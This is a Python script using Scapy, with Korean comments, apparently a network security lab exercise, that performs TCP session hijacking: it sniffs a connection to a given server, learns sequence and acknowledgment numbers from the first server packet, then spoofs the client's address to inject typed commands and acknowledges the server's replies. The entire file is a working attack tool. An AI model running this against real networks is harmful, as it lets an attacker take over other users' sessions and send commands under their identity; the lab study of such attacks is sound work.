#!/usr/bin/python3
# Step 1: PDF 원본(Step 0) 골격 유지 + 서버 응답 수신/출력 확장.

import sys
import getopt
import threading
from scapy.all import *

dev = "h3-eth0"
srv_port = None
srv_ip = None
client_ip = None

# === Step 1 에서 추가한 전역 상태 ===
hijacked = False     # 첫 server->client 패킷을 잡았는지 여부
my_seq = 0           # 우리가 다음에 보낼 seq (client 사칭)
my_ack = 0           # 우리가 다음 기대하는 server seq
cli_ip = None        # 첫 캡처에서 학습한 victim client IP
cli_port = None      # 첫 캡처에서 학습한 victim client port


def input_loop():
    global my_seq
    while True:
        inject_data = input(">> ")
        inject_data = inject_data + "\n"
        if not hijacked:
            print("(not hijacked yet)")
            continue
        packet = IP(src=cli_ip, dst=srv_ip) \
                 / TCP(sport=cli_port, dport=srv_port, seq=my_seq, ack=my_ack,
                       flags="PA") \
                 / inject_data
        send(packet, iface=dev, verbose=False)
        my_seq += len(inject_data)


def handle_packet(packet):
    global hijacked, my_seq, my_ack, cli_ip, cli_port

    ip = packet.getlayer("IP")
    tcp = packet.getlayer("TCP")
    flags = tcp.sprintf("%flags%")

    print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))

    # Check if this is a hijackable packet
    if tcp.sprintf("%flags%") == "A" or tcp.sprintf("%flags%") == "PA":

        # The packet is from server to client
        if tcp.sport == srv_port and ip.src == srv_ip:

            payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0

            if not hijacked:
                # 첫 캡처: 세션 인수
                cli_ip = ip.dst
                cli_port = tcp.dport
                my_seq = tcp.ack
                my_ack = tcp.seq + payload_len
                hijacked = True

                print("Got server sequence " + str(tcp.seq))
                print("Got client sequence " + str(tcp.ack) + "\n")
                print("Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, srv_port))
                print("Start sending messagge to the server")

                threading.Thread(target=input_loop, daemon=True).start()
                return

            # 이미 hijack 됨: 서버 응답을 받아 화면에 출력 + ACK 회신
            if payload_len > 0:
                if tcp.seq != my_ack:
                    return  # 중복/오래된 패킷
                data = bytes(packet.getlayer("Raw").load)
                print("[server] " + data.decode(errors='replace'), end='')
                my_ack += payload_len
                ack_pkt = IP(src=cli_ip, dst=srv_ip) \
                          / TCP(sport=cli_port, dport=srv_port, seq=my_seq, ack=my_ack,
                                flags="A")
                send(ack_pkt, iface=dev, verbose=False)


def usage():
    print(sys.argv[0])
    print("""
    -c <client_ip> (optional)
    -s <srv_ip>
    -p <srv_port>
    """)
    sys.exit(1)


try:
    cmd_opts = "c:s:p:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-s":
        srv_ip = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    else:
        usage()

if not srv_ip and not srv_port:
    usage()

if client_ip:
    print("Hijacking TCP connections from %s to " + \
          "%s on port %d" % (client_ip, srv_ip, srv_port))
    filter = "tcp and port " + str(srv_port) + \
             " and host " + srv_ip + " and host " + client_ip
else:
    print("Hijacking all TCP connections to " + \
          "%s on port %d" % (srv_ip, srv_port))
    filter = "tcp and port " + str(srv_port) + " and host " + srv_ip

sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
